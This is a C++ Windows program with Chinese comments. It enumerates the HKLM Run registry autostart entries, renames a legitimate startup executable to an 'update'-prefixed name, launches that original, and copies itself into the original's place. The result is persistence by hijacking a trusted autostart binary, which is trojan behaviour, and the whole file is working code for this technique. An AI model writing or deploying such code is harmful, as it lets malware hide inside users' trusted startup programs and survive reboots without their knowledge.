

#include <time.h> 
#include <windows.h> 
#include <iostream>
#include <stdio.h>  
#include <tchar.h>  
#include <fstream>
#include <queue>
#include  <io.h>
#include "CRegOperate.h"
#include "md5file.h"


char *GetFilename(char *p)
{
	int x = strlen(p);
	char ch = '\\';
	char *q = strrchr(p, ch) + 1;

	return q;
}


int _tmain(int argc, _TCHAR* argv[])
{
	//初始化临界区全局原子变量
	HANDLE MutexHandle = CreateMutex(NULL, FALSE, TEXT("Cc28256"));  //创建互斥体. 信号量为0. 有信号的状态.wait可以等待
	DWORD ErrorCode = 0;
	ErrorCode = GetLastError();
	if (ERROR_ALREADY_EXISTS == ErrorCode)
	{
		printf("对不起,程序已经启动一份了.这份即将关闭\r\n");
		CloseHandle(MutexHandle);

		system("pause");
	}
	if (NULL == MutexHandle)
	{
		return 0; //表示句柄获取失败
	}

	
	

	CHAR path[MAX_PATH] = { 0 };
	HMODULE hm = GetModuleHandle(NULL);
	GetModuleFileName(hm, path, sizeof(path));
	string selfMD5 = getFileMD5(path);

	//32位注册表
	TCHAR N1path[] = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

	//HKEY_CURRENT_USER
	CRegOperate test_reg(HKEY_LOCAL_MACHINE, N1path);
	//HKEY_CURRENT_USER


	string name_ = "update";
	char name2[MAX_PATH] = { 0 };
	char name3[MAX_PATH] = { 0 };
	char szCommandLine[MAX_PATH] = { 0 };
	bool isMD5Same = false;
	for (int i = 0; i < test_reg.vecKeyData.size(); i++)
	{
		if (_access(test_reg.vecKeyPath[i].c_str(), 0) != 0)
		{
			_tprintf(TEXT("%s，%s\n"), test_reg.vecKeyPath[i].c_str(), "不存在");
			continue;
		}

		_tprintf(TEXT("%s，%s\n"), test_reg.vecKeyPath[i].c_str(), "存在");
		if (selfMD5 == getFileMD5(test_reg.vecKeyPath[i].c_str()))
		{
			isMD5Same = true;
			strcpy_s(name3, test_reg.vecKeyData[i].c_str());
			name_ = name_ + GetFilename(name3);
			strcpy(GetFilename(name3), name_.c_str());
			STARTUPINFO si = { sizeof(si) };
			PROCESS_INFORMATION pi;
			si.dwFlags = STARTF_USESHOWWINDOW;//指定wShowWindow成员有效
			si.wShowWindow = TRUE;//此成员设为TRUE的话则显示新建进程的主窗口
			BOOL bRet = CreateProcess(
				NULL,//不在此指定可执行文件的文件名
				name3,//命令行参数
				NULL,//默认进程安全性
				NULL,//默认进程安全性
				FALSE,//指定当前进程内句柄不可以被子进程继承
				CREATE_NEW_CONSOLE,//为新进程创建一个新的控制台窗口
				NULL,//使用本进程的环境变量
				NULL,//使用本进程的驱动器和目录
				&si,
				&pi);
			_tprintf(TEXT("%s\n"), "成功");
			break;
			
		}
	}
	if (!isMD5Same)
	{
		for (int i = 0; i < test_reg.vecKeyData.size(); i++)
		{

			strcpy_s(name2, test_reg.vecKeyPath[i].c_str());
			name_ = name_ + GetFilename(name2);
			strcpy(GetFilename(name2), name_.c_str());

			strcpy_s(name3, test_reg.vecKeyData[i].c_str());
			name_ = name_ + GetFilename(name3);
			strcpy(GetFilename(name3), name_.c_str());

			if (!rename(test_reg.vecKeyPath[i].c_str(), name2))
			{
				//strcpy_s(szCommandLine, test_reg.vecKeyData[i].c_str());
				STARTUPINFO si = { sizeof(si) };
				PROCESS_INFORMATION pi;
				si.dwFlags = STARTF_USESHOWWINDOW;//指定wShowWindow成员有效
				si.wShowWindow = TRUE;//此成员设为TRUE的话则显示新建进程的主窗口
				BOOL bRet = CreateProcess(
					NULL,//不在此指定可执行文件的文件名
					name3,//命令行参数
					NULL,//默认进程安全性
					NULL,//默认进程安全性
					FALSE,//指定当前进程内句柄不可以被子进程继承
					CREATE_NEW_CONSOLE,//为新进程创建一个新的控制台窗口
					NULL,//使用本进程的环境变量
					NULL,//使用本进程的驱动器和目录
					&si,
					&pi);
				_tprintf(TEXT("%s\n"), "成功");
				CopyFile(path, test_reg.vecKeyPath[i].c_str(), false);
				break;
			}
			name_.clear();
			name_ = "update";
		}
	}

	//int _access(const char *pathname, int mode);位于头文件<io.h>中
	/*
	返回0存在 -1不存在
	mode的值和含义如下所示：
	00——只检查文件是否存在
	02——写权限
	04——读权限
	06——读写权限
	*/

	//char s[] = "C:\\Program Files\\Realtek\\Audio\\HDA\\RtkAudioService64.exe";
	//if (_access(s, 0)==0)
	//{
	//	_tprintf(TEXT("%s，%s\n"), s, "存在");
	//}
	//
	system("pause");

	return 0;

}
